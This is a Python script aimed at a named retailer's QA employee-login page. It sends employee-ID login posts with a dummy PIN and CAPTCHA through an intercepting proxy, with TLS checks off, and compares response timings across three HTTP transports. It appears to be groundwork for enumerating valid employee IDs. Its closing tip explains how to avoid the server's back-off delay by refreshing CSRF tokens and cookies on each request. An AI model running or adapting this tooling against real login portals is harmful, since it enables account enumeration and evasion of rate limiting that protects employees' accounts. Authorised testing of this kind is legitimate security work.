#!/usr/bin/env python3
import asyncio, argparse, time, re, json, statistics as stats
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Any, List, Tuple, Optional
import numpy as np
from tqdm import tqdm

BASE = "https://pwrqa.macys.net"
ROOT = "/"
PROXY = "http://192.168.1.228:8080"
VERIFY_TLS = False  # like -k

VALID_A = "01002206"
FAKE_X  = "99887766"

TIMEOUT = 30_000  # ms

HEADER_BROWSER = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Origin": BASE,
    "Referer": BASE + "/",
}
HEADER_MIN = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
}

# ---------- Utilities ----------
def urlenc(pairs: List[Tuple[str,str]]) -> str:
    def enc(s: str) -> str:
        out=[]
        for ch in s:
            if ch.isalnum() or ch in "._-* ":
                out.append(ch if ch!=" " else "+")
            else:
                out.append("%{:02X}".format(ord(ch)))
        return "".join(out)
    return "&".join(f"{enc(k)}={enc(v)}" for k,v in pairs)

def extract_hidden(html: str) -> List[Tuple[str,str]]:
    pairs=[]
    for m in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*>', html, re.I):
        tag = m.group(0)
        n = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        v = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if n:
            pairs.append((n.group(1), v.group(1) if v else ""))
    return pairs

def pick(html: str, cands: List[str], default: str) -> str:
    for n in cands:
        if re.search(rf'name=["\']{re.escape(n)}["\']', html, re.I): return n
    return default

def summarize(xs: List[float]) -> Dict[str, Any]:
    if not xs: return {"n":0}
    xp = np.array(xs)
    return {
        "n": len(xs),
        "median": float(np.median(xp)),
        "mean": float(np.mean(xp)),
        "p10": float(np.percentile(xp,10)),
        "p90": float(np.percentile(xp,90)),
        "min": float(np.min(xp)),
        "max": float(np.max(xp)),
    }

# ---------- Transport: pycurl ----------
import pycurl, io

@dataclass
class CurlTiming:
    namelookup: float
    connect: float
    appconnect: float
    starttransfer: float
    total: float

def curl_timing(e: pycurl.Curl) -> CurlTiming:
    # seconds -> ms
    gl = lambda k: 1000.0*e.getinfo(k)
    return CurlTiming(
        namelookup=gl(pycurl.NAMELOOKUP_TIME),
        connect=gl(pycurl.CONNECT_TIME),
        appconnect=gl(pycurl.APPCONNECT_TIME),
        starttransfer=gl(pycurl.STARTTRANSFER_TIME),
        total=gl(pycurl.TOTAL_TIME),
    )

def curl_easy(method: str, path: str, headers: Dict[str,str], data: Optional[str], with_cookies: bool, cookiejar: Optional[str]) -> Tuple[int, str, CurlTiming]:
    buf = io.BytesIO()
    e = pycurl.Curl()
    try:
        e.setopt(e.URL, BASE + path)
        e.setopt(e.PROXY, PROXY)
        e.setopt(e.SSL_VERIFYPEER, 0 if not VERIFY_TLS else 1)
        e.setopt(e.SSL_VERIFYHOST, 0 if not VERIFY_TLS else 2)
        e.setopt(e.HTTP_VERSION, e.HTTP_VERSION_1_1)
        e.setopt(e.CONNECTTIMEOUT, int(TIMEOUT/1000))
        e.setopt(e.TIMEOUT, int(TIMEOUT/1000))
        e.setopt(e.WRITEDATA, buf)
        e.setopt(e.NOPROGRESS, True)
        hdrs=[f"{k}: {v}" for k,v in headers.items()]
        e.setopt(e.HTTPHEADER, hdrs)
        if method.upper()=="POST":
            e.setopt(e.POST, 1)
            e.setopt(e.POSTFIELDS, data or "")
        if with_cookies:
            # Use an in-memory cookie jar file if provided
            if cookiejar:
                e.setopt(e.COOKIEFILE, cookiejar)
                e.setopt(e.COOKIEJAR, cookiejar)
        e.perform()
        code = e.getinfo(e.RESPONSE_CODE)
        timing = curl_timing(e)
        body = buf.getvalue().decode("utf-8", errors="replace")
        return code, body, timing
    finally:
        e.close()

# ---------- Transport: httpx (control) ----------
import httpx
def httpx_client():
    timeout = httpx.Timeout(connect=15.0, read=30.0)
    return httpx.Client(http2=False, verify=VERIFY_TLS, proxies={"http://":PROXY,"https://":PROXY},
                         headers={"Connection":"keep-alive"}, timeout=timeout, follow_redirects=True)

# ---------- Transport: Playwright ----------
from playwright.async_api import async_playwright

async def pw_open(headless=True):
    pw = await async_playwright().start()
    browser = await pw.chromium.launch(headless=headless, args=[
        "--ignore-certificate-errors","--allow-insecure-localhost",
        f"--proxy-server={PROXY}","--proxy-bypass-list=",
        "--no-sandbox","--disable-dev-shm-usage"])
    ctx = await browser.new_context(ignore_https_errors=not VERIFY_TLS, proxy={"server":PROXY})
    api = await pw.request.new_context(base_url=BASE, ignore_https_errors=not VERIFY_TLS, proxy={"server":PROXY},
                                       storage_state=await ctx.storage_state())
    return pw, browser, ctx, api

async def pw_close(pw, browser, ctx, api):
    await api.dispose()
    await ctx.close()
    await browser.close()
    await pw.stop()

# ---------- Behaviors to test ----------
@dataclass
class StaticFields:
    emp: str
    pin: str
    cap: str

def payload(static: StaticFields, hidden: List[Tuple[str,str]], eid: str, with_pin: bool=True, with_captcha: bool=True) -> List[Tuple[str,str]]:
    out = list(hidden)
    out.append((static.emp, eid))
    if with_pin: out.append((static.pin, "0000"))
    if with_captcha: out.append((static.cap, "999999"))
    return out

async def discover_static_playwright(ctx) -> Tuple[StaticFields, List[Tuple[str,str]]]:
    page = await ctx.new_page()
    r = await page.goto(BASE + ROOT, wait_until="domcontentloaded", timeout=TIMEOUT)
    html = await page.content()
    await page.close()
    emp = pick(html, ["EmployeeId","EmployeeID","employeeId","UserName","EmployeeNumber"], "EmployeeId")
    pin = pick(html, ["Pin","PIN","pin"], "Pin")
    cap = pick(html, ["CaptchaCode","CaptchaText","captcha","Captcha"], "CaptchaCode")
    return StaticFields(emp, pin, cap), extract_hidden(html)

# ---------- Diagnostic runners ----------
def diag_curl_get(n: int, with_cookies: bool, cookiejar: Optional[str]) -> Dict[str,Any]:
    timings=[]
    codes=[]
    for _ in range(n):
        code, body, t = curl_easy("GET", ROOT, {"Accept":"*/*","Connection":"keep-alive"}, None, with_cookies, cookiejar)
        timings.append(t.__dict__)
        codes.append(code)
    return {"transport":"pycurl","op":"GET","codes":codes,"timings":timings}

def diag_curl_post(n: int, with_cookies: bool, cookiejar: Optional[str],
                   static: StaticFields, hidden: List[Tuple[str,str]], use_hidden: bool, headers_browser: bool) -> Dict[str,Any]:
    timings=[]; codes=[]
    hdrs = HEADER_BROWSER if headers_browser else HEADER_MIN
    for _ in range(n):
        h = hidden if use_hidden else []
        body = urlenc(payload(static, h, VALID_A, with_pin=True, with_captcha=True))
        code, text, t = curl_easy("POST", ROOT, hdrs, body, with_cookies, cookiejar)
        timings.append(t.__dict__)
        codes.append(code)
    return {"transport":"pycurl","op":"POST","use_hidden":use_hidden,"cookies":with_cookies,"headers":"browser" if headers_browser else "min","codes":codes,"timings":timings}

def diag_httpx_get(n: int) -> Dict[str,Any]:
    c = httpx_client()
    totals=[]; codes=[]
    for _ in range(n):
        s=time.perf_counter_ns(); r=c.get(BASE+ROOT); e=time.perf_counter_ns()
        totals.append((e-s)/1e6); codes.append(r.status_code)
    c.close()
    return {"transport":"httpx","op":"GET","codes":codes,"total_ms":totals}

def diag_httpx_post(n: int, static: StaticFields, hidden: List[Tuple[str,str]], use_hidden: bool, headers_browser: bool) -> Dict[str,Any]:
    c = httpx_client()
    hdrs = HEADER_BROWSER if headers_browser else HEADER_MIN
    totals=[]; codes=[]
    for _ in range(n):
        h = hidden if use_hidden else []
        data = urlenc(payload(static, h, VALID_A, True, True))
        s=time.perf_counter_ns(); r=c.post(BASE+ROOT, data=data, headers=hdrs); e=time.perf_counter_ns()
        totals.append((e-s)/1e6); codes.append(r.status_code)
    c.close()
    return {"transport":"httpx","op":"POST","use_hidden":use_hidden,"headers":"browser" if headers_browser else "min","codes":codes,"total_ms":totals}

async def diag_pw_get(n: int, api) -> Dict[str,Any]:
    totals=[]; codes=[]
    for _ in range(n):
        s=time.perf_counter_ns(); r=await api.get(ROOT, timeout=TIMEOUT); e=time.perf_counter_ns()
        totals.append((e-s)/1e6); codes.append(r.status)
    return {"transport":"playwright","op":"GET","codes":codes,"total_ms":totals}

async def diag_pw_post(n: int, api, static: StaticFields, hidden: List[Tuple[str,str]], use_hidden: bool, headers_browser: bool) -> Dict[str,Any]:
    hdrs = HEADER_BROWSER if headers_browser else HEADER_MIN
    totals=[]; codes=[]
    for _ in range(n):
        h = hidden if use_hidden else []
        data = urlenc(payload(static, h, VALID_A, True, True))
        s=time.perf_counter_ns(); r=await api.post(ROOT, data=data, headers=hdrs, timeout=TIMEOUT); e=time.perf_counter_ns()
        totals.append((e-s)/1e6); codes.append(r.status)
    return {"transport":"playwright","op":"POST","use_hidden":use_hidden,"headers":"browser" if headers_browser else "min","codes":codes,"total_ms":totals}

# ---------- Orchestrator ----------
def summarize_diag(results: List[Dict[str,Any]]) -> List[Dict[str,Any]]:
    rows=[]
    for r in results:
        row = {"transport":r["transport"], "op":r["op"]}
        if r["transport"]=="pycurl":
            st = [t["starttransfer"] for t in r["timings"]]
            tt = [t["total"] for t in r["timings"]]
            row.update({
                "use_hidden": r.get("use_hidden"),
                "cookies": r.get("cookies"),
                "headers": r.get("headers"),
                "codes": r["codes"],
                "starttransfer_ms": summarize(st),
                "total_ms": summarize(tt),
            })
        else:
            tt = r["total_ms"]
            row.update({
                "use_hidden": r.get("use_hidden"),
                "headers": r.get("headers"),
                "codes": r["codes"],
                "total_ms": summarize(tt),
            })
        rows.append(row)
    return rows

async def main():
    ap = argparse.ArgumentParser(description="Shotgun diagnostic: race transports/behaviors, pick the fastest.")
    ap.add_argument("--samples", type=int, default=6, help="Samples per combination (keep small for diagnostics)")
    ap.add_argument("--outdir", default="./enum_diag_out")
    args = ap.parse_args()
    outdir = Path(args.outdir); outdir.mkdir(parents=True, exist_ok=True)

    # Prepare a cookiejar file for pycurl (so it can store cookies between GET and POST if we want)
    cookiejar = str(outdir / "curl_cookies.txt")

    # ---- Playwright session to discover fields & hidden ----
    from playwright.async_api import async_playwright
    pw = await async_playwright().start()
    browser = await pw.chromium.launch(headless=True, args=[
        "--ignore-certificate-errors", f"--proxy-server={PROXY}", "--proxy-bypass-list=",
        "--no-sandbox","--disable-dev-shm-usage"])
    ctx = await browser.new_context(ignore_https_errors=not VERIFY_TLS, proxy={"server":PROXY})
    static, hidden0 = await discover_static_playwright(ctx)
    # Also fetch hidden via pycurl with cookies stored
    _ = curl_easy("GET", ROOT, {"Accept":"*/*","Connection":"keep-alive"}, None, True, cookiejar)

    # ---- Build tasks ----
    results: List[Dict[str,Any]] = []

    # GET diagnostics across transports
    results.append(diag_curl_get(args.samples, with_cookies=True, cookiejar=cookiejar))
    results.append(diag_curl_get(args.samples, with_cookies=False, cookiejar=None))
    results.append(diag_httpx_get(args.samples))
    api = await pw.request.new_context(base_url=BASE, ignore_https_errors=not VERIFY_TLS, proxy={"server":PROXY},
                                       storage_state=await ctx.storage_state())
    results.append(await diag_pw_get(args.samples, api))

    # POST diagnostics across transports & behaviors
    combos = [
        # (use_hidden, with_cookies/header_profile)
        (True,  True,  True),
        (True,  True,  False),
        (True,  False, True),
        (False, True,  True),
        (False, False, True),
    ]
    for use_hidden, with_cookies, hdr_browser in combos:
        # pycurl
        results.append(diag_curl_post(args.samples, with_cookies, cookiejar if with_cookies else None,
                                      static, hidden0, use_hidden=use_hidden, headers_browser=hdr_browser))
        # httpx
        results.append(diag_httpx_post(args.samples, static, hidden0, use_hidden=use_hidden, headers_browser=hdr_browser))
        # playwright
        results.append(await diag_pw_post(args.samples, api, static, hidden0, use_hidden=use_hidden, headers_browser=hdr_browser))

    # Close PW
    await api.dispose(); await ctx.close(); await browser.close(); await pw.stop()

    # ---- Summarize ----
    table = summarize_diag(results)
    (outdir/"diag_results.json").write_text(json.dumps(table, indent=2))

    # Print a compact view sorted by median total_ms (or starttransfer for pycurl)
    def score(row):
        if row["transport"]=="pycurl":
            return row["starttransfer_ms"]["median"] if row["op"]=="POST" else row["total_ms"]["median"]
        return row["total_ms"]["median"]

    table_sorted = sorted(table, key=score)
    print("\n=== Fastest combos (lower is better) ===")
    for r in table_sorted[:10]:
        if r["transport"]=="pycurl" and r["op"]=="POST":
            med = r["starttransfer_ms"]["median"]
            tot = r["total_ms"]["median"]
            print(f"{r['transport']:10s} {r['op']:4s} hidden={r['use_hidden']} cookies={r.get('cookies')} hdr={r.get('headers')}  starttransfer≈{med:.1f}ms  total≈{tot:.1f}ms  codes={r['codes'][:3]}")
        else:
            med = r["total_ms"]["median"]
            print(f"{r['transport']:10s} {r['op']:4s} hidden={r.get('use_hidden')} hdr={r.get('headers')}  total≈{med:.1f}ms  codes={r['codes'][:3]}")

    print(f"\nFull JSON: {outdir/'diag_results.json'}")
    print("\nTip: if *only* POST without hidden tokens is ~5s while GET is fast, the app is back-off sleeping. Use per-request fresh hidden/CSRF + cookies.")

if __name__ == "__main__":
    asyncio.run(main())

